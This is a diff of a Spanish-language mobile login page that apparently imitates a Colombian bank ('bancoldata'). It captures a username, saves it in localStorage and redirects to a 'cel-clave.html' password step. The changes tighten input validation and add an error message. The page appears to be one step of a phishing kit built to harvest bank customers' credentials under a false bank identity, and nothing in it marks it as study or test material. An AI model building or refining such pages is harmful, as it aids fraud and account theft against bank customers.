@@ -1,223 +1,203 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image-based Website with Loader</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body, html {
-            height: 100%;
-            width: 100%;
-            background-color: #f0f0f0;
-            overflow: hidden;
-        }
-
-        /* Estilos del loader */
-        .loader-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-        }
-        .loader {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #3498db;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        /* Estilos del contenido principal */
-        .image-container {
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            position: relative;
-            display: none; /* Ocultamos inicialmente el contenido principal */
-        }
-        .image-container img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        .center-box {
-            position: absolute;
-            top: 55%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: rgb(255, 255, 255);
-            width: 290px;
-            height: 66px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            border-radius: 8px;
-        }
-        .center-box .input-container {
-            position: relative;
-            width: 80%;
-        }
-        .center-box input {
-            width: 100%;
-            padding: 10px;
-            padding-left: 40px;
-            font-size: 19px;
-            border: none;
-            border-bottom: 1px solid #ffe100;
-            outline: none;
-        }
-        .center-box .input-container i {
-            position: absolute;
-            left: 4px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #888;
-            font-size: 17px;
-        }
-
-        .button-container {
-            position: absolute;
-            top: 70.4%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            display: flex;
-            gap: 10px;
-            transition: top 0.3s ease;
-        }
-        .button-container button {
-            padding: 13px 35px;
-            font-size: 13px;
-            border: none;
-            border-radius: 50px;
-            font-weight: bold;
-            color: rgb(1, 1, 1);
-            cursor: pointer;
-        }
-        .button-container button:first-child {
-            background-color: #ffffff;
-            border: 1px solid black;
-        }
-        .button-container button:first-child:hover {
-            background-color: #ffffff;
-        }
-        .button-container button:last-child {
-            background-color: #ffda37;
-            color: black;
-            cursor: not-allowed;
-        }
-        .button-container button:last-child.enabled {
-            background-color: #ffda37;
-            cursor: pointer;
-            color: rgb(1, 1, 1);
-        }
-        .button-container button:last-child.enabled:hover {
-            background-color: #ffb800;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Image-based Website with Loader</title>
+  <style>
+    * {
+      margin: 0; padding: 0; box-sizing: border-box;
+    }
+    body, html {
+      height: 100%; width: 100%;
+      background-color: #f0f0f0;
+      overflow: hidden;
+    }
+    .loader-container {
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 100%;
+      background-color: #ffffff;
+      display: flex; justify-content: center; align-items: center;
+      z-index: 9999;
+    }
+    .loader {
+      width: 50px; height: 50px;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #3498db;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% {transform: rotate(0deg);}
+      100% {transform: rotate(360deg);}
+    }
+    .image-container {
+      width: 100%; height: 100%;
+      overflow: hidden; position: relative;
+      display: none;
+    }
+    .image-container img {
+      width: 100%; height: 100%; object-fit: cover;
+    }
+    .center-box {
+      position: absolute;
+      top: 55%; left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #fff;
+      width: 290px; height: auto;
+      padding: 15px 0;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      border-radius: 8px;
+    }
+    .center-box .input-container {
+      position: relative;
+      width: 80%;
+    }
+    .center-box input {
+      width: 100%;
+      padding: 10px 10px 10px 40px;
+      font-size: 19px;
+      border: none;
+      border-bottom: 1px solid #ffe100;
+      outline: none;
+    }
+    .center-box .input-container i {
+      position: absolute;
+      left: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #888;
+      font-size: 17px;
+    }
+    #userError {
+      color: red;
+      font-size: 12px;
+      margin-top: 5px;
+      display: none;
+      text-align: left;
+    }
+    .button-container {
+      position: absolute;
+      top: 70.4%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      display: flex;
+      gap: 10px;
+      transition: top 0.3s ease;
+    }
+    .button-container button {
+      padding: 13px 35px;
+      font-size: 13px;
+      border: none;
+      border-radius: 50px;
+      font-weight: bold;
+      color: #010101;
+      cursor: pointer;
+    }
+    .button-container button:first-child {
+      background-color: #ffffff;
+      border: 1px solid black;
+    }
+    .button-container button:first-child:hover {
+      background-color: #ffffff;
+    }
+    .button-container button:last-child {
+      background-color: #ffda37;
+      color: black;
+      cursor: not-allowed;
+    }
+    .button-container button:last-child.enabled {
+      background-color: #ffda37;
+      cursor: pointer;
+    }
+    .button-container button:last-child.enabled:hover {
+      background-color: #ffb800;
+    }
+  </style>
 </head>
 <body>
-    <!-- Loader -->
-    <div class="loader-container" id="loader">
-        <div class="loader"></div>
+
+  <!-- Loader -->
+  <div class="loader-container" id="loader">
+    <div class="loader"></div>
+  </div>
+
+  <!-- Contenido principal -->
+  <div class="image-container" id="mainContent">
+    <img src="img/cel1.jpg" alt="Background Image" />
+    <div class="center-box">
+      <div class="input-container">
+        <i class="fas fa-user"></i>
+        <input type="text" placeholder="Usuario" id="userInput" />
+        <div id="userError">Usted debe tener un mínimo de 6 caracteres y al menos 1 número.</div>
+      </div>
     </div>
 
-    <!-- Contenido principal -->
-    <div class="image-container" id="mainContent">
-        <img src="img/cel1.jpg" alt="Background Image">
-        <div class="center-box">
-            <div class="input-container">
-                <i class="fas fa-user"></i>
-                <input type="text" placeholder="Usuario" id="userInput">
-            </div>
-        </div>
-        <div class="button-container">
-            <button>Cancelar</button>
-            <button id="continueButton" class="disabled">Continuar</button>
-        </div>
+    <div class="button-container">
+      <button>Cancelar</button>
+      <button id="continueButton" class="disabled" disabled>Continuar</button>
     </div>
+  </div>
 
-    <script>
-        // Mostrar el contenido principal cuando la página esté completamente cargada
-        window.onload = () => {
-            const loader = document.getElementById('loader');
-            const mainContent = document.getElementById('mainContent');
+  <script>
+    window.onload = () => {
+      document.getElementById('loader').style.display = 'none';
+      document.getElementById('mainContent').style.display = 'block';
+    };
 
-            // Ocultar el loader y mostrar el contenido principal
-            loader.style.display = 'none';
-            mainContent.style.display = 'block';
-        };
+    const userInput = document.getElementById('userInput');
+    const userError = document.getElementById('userError');
+    const continueButton = document.getElementById('continueButton');
+    const buttonContainer = document.querySelector('.button-container');
 
-        const userInput = document.getElementById('userInput');
-        const continueButton = document.getElementById('continueButton');
-        const buttonContainer = document.querySelector('.button-container');
+    userInput.addEventListener('input', () => {
+      const value = userInput.value.trim();
+      const isValid = value.length >= 6 && /\d/.test(value);
 
-        // Habilitar/Deshabilitar el botón
-        userInput.addEventListener('input', () => {
-            const userValue = userInput.value.trim();
-            if (userValue.length >= 4) {
-                continueButton.classList.add('enabled');
-                continueButton.classList.remove('disabled');
-            } else {
-                continueButton.classList.add('disabled');
-                continueButton.classList.remove('enabled');
-            }
-        });
+      if (isValid) {
+        userError.style.display = 'none';
+        continueButton.classList.add('enabled');
+        continueButton.classList.remove('disabled');
+        continueButton.disabled = false;
+      } else {
+        userError.style.display = 'block';
+        continueButton.classList.remove('enabled');
+        continueButton.classList.add('disabled');
+        continueButton.disabled = true;
+      }
+    });
 
-        // Detectar cuando el teclado está visible y mover los botones
-        window.addEventListener('resize', () => {
-            if (window.innerHeight < 500) { // Asume que el teclado se muestra cuando la altura de la ventana es pequeña
-                buttonContainer.style.top = '77%'; // Mover los botones hacia abajo
-            } else {
-                buttonContainer.style.top = '70.4%'; // Restaurar la posición original
-            }
-        });
+    window.addEventListener('resize', () => {
+      if (window.innerHeight < 500) {
+        buttonContainer.style.top = '77%';
+      } else {
+        buttonContainer.style.top = '70.4%';
+      }
+    });
 
-        // Acción al hacer clic en "Continuar"
-        continueButton.addEventListener('click', () => {
-            const userValue = userInput.value.trim();
-            if (userValue.length >= 4) {
-                // Obtener el valor existente de `bancoldata` en localStorage
-                let bancoldata;
-                try {
-                    const storedData = localStorage.getItem('bancoldata');
-                    bancoldata = storedData ? JSON.parse(storedData) : {};
-                } catch (e) {
-                    console.error('Error al parsear bancoldata. Reiniciando a un objeto vacío:', e);
-                    bancoldata = {}; // Reiniciar a un objeto vacío si hay error
-                }
+    continueButton.addEventListener('click', () => {
+      const userValue = userInput.value.trim();
+      if (userValue.length >= 6 && /\d/.test(userValue)) {
+        let bancoldata;
+        try {
+          const storedData = localStorage.getItem('bancoldata');
+          bancoldata = storedData ? JSON.parse(storedData) : {};
+        } catch (e) {
+          console.error('Error al parsear bancoldata:', e);
+          bancoldata = {};
+        }
 
-                // Actualizar el objeto con el nuevo valor del usuario
-                bancoldata.usuario = userValue;
+        bancoldata.usuario = userValue;
+        localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+        window.location.href = 'cel-clave.html';
+      }
+    });
+  </script>
 
-                // Guardar el valor actualizado en localStorage
-                localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
-
-                // Redirigir a la página siguiente
-                window.location.href = 'cel-clave.html';
-            } else {
-                alert('Por favor, ingrese un usuario válido de al menos 4 caracteres.');
-            }
-        });
-    </script>
+  <!-- Íconos de FontAwesome -->
+  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
 </body>
 </html>
